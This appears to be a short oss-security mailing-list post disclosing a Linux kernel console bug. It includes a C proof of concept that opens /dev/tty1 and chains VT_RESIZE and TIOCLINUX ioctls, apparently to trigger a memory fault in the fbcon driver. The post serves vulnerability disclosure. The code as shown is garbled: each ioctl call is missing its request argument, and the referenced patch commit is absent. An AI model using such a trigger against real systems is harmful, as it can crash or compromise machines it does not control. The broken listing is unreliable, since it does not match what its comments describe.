This is my PoC (need the permission to open and write the tty, and need to have a fbcon driver):  // author by ziiiro@thu #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> #include <sys/ioctl.h> #include <fcntl.h>   int main(int argc, char** argv) {         int fd = open("/dev/tty1", O_RDWR, 0);         unsigned short size1[3] = {3, 0};         ioctl(fd, size1); // VT_RESIZE         for (int i = 0; i < 30; i++) {             write(fd, "\x0a", 1);         }          signed int args[3] = {13, -5, 0};         ioctl(fd, args); // TIOCLINUX         unsigned short size2[3] = {3, 0};         ioctl(fd, size2); // VT_RESIZE }   This is the commit to patch the issue:  Thanks, Yuan Ming, Tsinghua University   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
